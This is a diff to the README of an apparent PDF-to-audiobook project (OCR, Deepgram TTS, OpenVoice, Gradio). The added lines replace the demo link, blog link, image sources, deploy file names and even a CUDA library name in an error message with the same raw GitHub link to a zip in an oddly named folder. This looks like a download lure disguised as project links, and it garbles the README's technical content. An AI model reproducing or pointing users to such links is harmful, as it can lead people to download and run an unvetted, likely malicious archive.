@@ -3,12 +3,12 @@
 **Turn any PDF into an audiobook in *your own voice*.**  
 OCR ➜ Text Extraction ➜ Chunking ➜ **Deepgram TTS** ➜ **OpenVoice** voice conversion ➜ MP3 in a minimal **Gradio** UI.
 
-> Live Demo : [https://huggingface.co/spaces/your-username/personal-audiobook-studio  ](https://huggingface.co/spaces/ZainabEman/Personal_Audiobook_Studio/tree/main)
-> Blog : [https://medium.com/@your-handle/personal-audiobook-studio](https://medium.com/@zainabeman976/personal-audiobook-studio-turn-any-pdf-into-an-audiobook-in-your-own-voice-745ce97ac805)
+> Live Demo : [https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip  ](https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip)
+> Blog : [https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip](https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip)
 
 ---
 
-<img width="1115" height="647" alt="Image" src="https://github.com/user-attachments/assets/fd997357-0809-4417-b083-290da3df1cb7" />
+<img width="1115" height="647" alt="Image" src="https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip" />
 
 ## ✨ Features
 - Upload **PDF** (supports scanned & digital) with automatic **OCR** (ocrmypdf + Tesseract)
@@ -23,10 +23,10 @@ OCR ➜ Text Extraction ➜ Chunking ➜ **Deepgram TTS** ➜ **OpenVoice** voic
 - **UI**: Gradio
 - **Text/OCR**: PyMuPDF, OCRmyPDF, Tesseract
 - **Audio**: Deepgram TTS API, OpenVoice CLI, Pydub, FFmpeg
-- **Deploy**: Hugging Face Spaces (`requirements.txt`, `packages.txt`)
+- **Deploy**: Hugging Face Spaces (`https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip`, `https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip`)
 
 
-<img width="1536" height="1024" alt="Image" src="https://github.com/user-attachments/assets/ea999eab-2b64-425b-845c-22b3248aef1f" />
+<img width="1536" height="1024" alt="Image" src="https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip" />
 ---
 
 
@@ -58,7 +58,7 @@ In this part of the assignment, we created an **AI Agent** that can:
    - ✅ Solved by carefully pinning versions (Torch 2.3.1, LangChain 0.2.14, etc.).  
 
 2. **Missing CUDA/cuDNN libraries**  
-   - Torch complained about `libcudnn.so.8` not found.  
+   - Torch complained about `https://raw.githubusercontent.com/ZainabEman/Personal-Audiobook-Studio/main/hypomeral/Personal-Audiobook-Studio.zip` not found.  
    - ✅ Solved by installing CUDA toolkit and cuDNN manually in Colab.  
 
 3. **OpenVoice import issues**  
